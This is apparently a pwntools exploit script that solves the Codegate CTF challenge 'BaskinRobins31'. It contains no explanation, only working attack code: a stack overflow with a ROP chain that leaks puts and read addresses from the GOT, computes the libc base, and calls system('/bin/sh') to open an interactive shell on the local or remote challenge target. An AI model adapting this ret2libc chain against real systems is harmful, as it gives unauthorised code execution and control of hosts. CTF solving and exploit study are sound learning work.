from pwn import *
import sys

if len(sys.argv) == 1:
	p = process("./BaskinRobins31")
else:
	p = remote("ch41l3ng3s.codegate.kr", 3131)

pop_rdi = 0x400BC2+1
puts_plt = 0x4006C0
puts_got = 0x602020
read_got = 0x602040
main = 0x400A4B

payload = "a" * 0xb8
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)
p.recvuntil("How many numbers do you want to take ? (1-3)")
p.send(payload)

p.recvuntil("Don't break the rules...:( \n")
puts_addr = u64(p.recvline()[:-1].ljust(8,"\x00"))
read_addr = u64(p.recvline()[:-1].ljust(8,"\x00"))
log.info("puts : 0x%x" % puts_addr)
log.info("read : 0x%x" % read_addr)


libc_base = read_addr - 0xf7250
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57
log.info("libc base : 0x%x" % libc_base)

payload = "a" * 0xb8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.recvuntil("How many numbers do you want to take ? (1-3)")
p.send(payload)

p.interactive()
